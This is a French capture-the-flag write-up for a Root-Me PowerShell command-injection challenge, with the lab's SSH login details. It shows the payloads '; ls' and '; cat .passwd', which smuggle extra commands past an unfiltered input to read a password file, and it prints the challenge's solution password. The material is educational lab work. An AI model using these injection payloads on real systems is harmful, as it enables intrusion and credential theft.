# Exercice 5 — PowerShell — Command Injection

## Contexte

- Protocole : SSH
- Port : `2225`
- Hôte : `challenge05.root-me.org`
- Utilisateur : `app-script-ch18`
- Mot de passe : `app-script-ch18`

```bash
ssh -p 2225 app-script-ch18@challenge05.root-me.org
```

## Problème

Le programme exécute une commande utilisateur sans filtrage suffisants. Il est possible de sortir de la commande normale en injectant un séparateur de commande.

## Technique

On utilise `;` pour exécuter une seconde commande après la commande initiale.

```powershell
; ls
; cat .passwd
```

## Solution

On trouve le mot de passe :

```text
SecureIEXpassword
```

## Explication

L’application n’isole pas correctement les entrées utilisateur. En injectant une commande supplémentaire après un séparateur, on peut exécuter des commandes arbitraires dans le contexte du shell.
